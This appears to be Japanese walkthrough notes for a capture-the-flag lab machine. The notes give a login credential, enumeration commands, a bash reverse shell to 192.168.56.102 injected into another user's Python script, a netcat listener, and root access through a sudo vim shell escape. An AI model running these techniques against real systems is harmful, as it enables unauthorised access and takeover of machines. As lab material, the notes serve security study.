|ユーザ名|パスワード|
|:--|:--|
|daniel|C@ughtm3napping123|

### danielでssh
- `ssh daniel@192.168.56.105`


### システム内探索
- `id`
  - ユーザが1001,1002の複数所属しているグループを確認する
- `sudo -l`
- SUIDを確認 
- `groups`
  - administratorsグループに属しているのがわかる
### データベースにアクセスする
- 特に何もない

### danielユーザでできることが何もない
- このグループで実行できる他のユーザを探す

### グループの実行可能ファイルを探して、リバースシェル
- `find / -group administrators 2> /dev/null`
- `/home/adrian/query.py`が見つかる。adrianユーザに変更を目指す
### リバースシェルの準備
- `/dev/shm/`ディレクトリにvimで次のrevshell.shを書く
- revshell.shファイルを作る
  ```
  #/bin/bash
  bash -c 'bash -i >& /dev/tcp/192.168.56.102/4242 0>&1'
  ```
- `chmod +x revshell.sh`
- vimでquery.pyに`os.system('/usr/bin/bash /dev/shm/revshell.sh')`を書き込む
```py
import os

os.system('/usr/bin/bash /dev/shm/revshell.sh')

now = datetime.now()
```
### リバースシェルのセッションの確立
- ParrotOS側のターミナル
- `nc -lvnp 4242`
- 2分ほど待ってるとセッションが確立される

### 対話シェルを奪取


### ルートシェルの取得
- `sudo -l`
- `sudo /usr/bin/vim -c ':!/bin/sh'`
- `cd /root`
- `ls`
- `cat root.txt`
